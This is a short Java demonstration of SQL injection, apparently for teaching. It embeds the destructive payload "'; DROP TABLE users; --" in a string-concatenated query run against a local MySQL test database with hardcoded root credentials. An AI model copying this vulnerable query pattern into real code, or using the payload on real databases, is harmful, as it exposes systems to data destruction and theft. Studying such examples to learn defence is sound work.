import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class SQLInjectionExample {

    public static void main(String[] args) {
        // Payload de SQL Injection relacionado con CVE-2019-5013
        String userInput = "'; DROP TABLE users; --"; // Entrada maliciosa

        // Conexión a la base de datos
        String url = "jdbc:mysql://localhost:3306/testdb";
        String username = "root";
        String password = "password";

        try (Connection connection = DriverManager.getConnection(url, username, password);
             Statement statement = connection.createStatement()) {

            // Consulta vulnerable, similar al problema en phpMyAdmin
            String query = "SELECT * FROM users WHERE name = '" + userInput + "'";
            System.out.println("Executing query: " + query);

            ResultSet resultSet = statement.executeQuery(query);

            // Procesar los resultados
            while (resultSet.next()) {
                System.out.println("User ID: " + resultSet.getInt("id"));
                System.out.println("User Name: " + resultSet.getString("name"));
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
